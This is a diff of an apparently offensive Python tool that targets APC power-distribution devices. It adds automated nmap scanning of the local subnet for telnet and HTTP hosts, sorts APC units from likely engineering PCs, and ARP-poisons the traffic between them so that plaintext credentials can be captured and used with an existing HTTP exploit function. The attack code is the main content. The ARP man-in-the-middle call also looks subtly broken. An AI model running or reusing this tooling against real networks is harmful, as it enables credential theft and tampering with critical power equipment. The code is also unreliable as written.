@@ -14,7 +14,7 @@ import re
 import os
 import random
 from halo import Halo
-from scapy import layers
+from scapy.layers.l2 import ARP
 import netifaces
 
 def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
@@ -173,19 +173,52 @@ def exploit_http(ip, username,password):
         prGreen('[+] Logged out.')
 
 def automagic():
-    print("Aye right ya skiddie! go learn how to pwn like a real h4ck3r :^)")
-    input("Press any key to confirm you suck")
     #Scan for APC device
     nm = nmap.PortScanner()
     interface_info = netifaces.ifaddresses('en0')
-    ip = interface_info[netifaces.AF_INET]
-    results = nm.scan(ip,arguments='-O -sV')
+    ip = interface_info[netifaces.AF_INET][0]['addr'] #Get current IP
+    cidr = sum(bin(int(x)).count('1') for x in interface_info[netifaces.AF_INET][0]['netmask'].split('.'))
+    target = ip +"/"+str(cidr)
+    spinner.text="Scanning "+target+" for APC devices with telnet(tcp/23) and HTTP(tcp/80) open..."
+    spinner.start()
+    results = nm.scan(target,arguments='-p 23, 80')
+    #prGreen("[+] OS: "+results['scan']['ip']['osmatch'][0]['name'])
+    spinner.succeed()
+    apc_devices=list()
+    eng_pcs=list()
+    for host in results['scan']:
+        prGreen("[+] Host: "+host)
+        for port in results['scan'][host]['tcp']:
+            service = results['scan'][host]['tcp'][port]['name']
+            product = results['scan'][host]['tcp'][port]['product']
+            prGreen("[+] Port: "+str(port))
+            prGreen('[+] Service: '+service)
+            if port==23 and service=='telnet' and 'apc' in product:
+                apc_devices.append(host)
+            else: #TODO add more coniditions here to narrow it down
+                eng_pcs.append(host)
+
+    prGreen("[+] Obtained the following APC device(s):")
+    for t in apc_devices:
+        prGreen("[+] "+t)
+
+    prGreen("[+] Obtained the following potential engineering PCs:")
+    for t in eng_pcs:
+        prGreen("[+] "+t)
+
+    for apc in apc_devices:
+        for pc in eng_pcs:
+            ARP.arp_mitm(pc,apc)
+
+
     #if found, posison all ARP cahces for any traffic going it, then monitor for plain text credentials (telnet or http)
-    #if creds found, exploit!
-    
     apc_switch_ip=""
     victim_ip=""
-    layers.l2.ARP.arp_mitm(victim_ip,apc_switch_ip)
+    #ARP.arp_mitm(victim_ip,apc_switch_ip)
+   #if creds found, exploit!
+    
+
+    
 
 def print_banner():
     fonts = ['alligator','alligator2','basic','big','block','chunky','colossal','cosmic','epic','isometric1','larry3d']
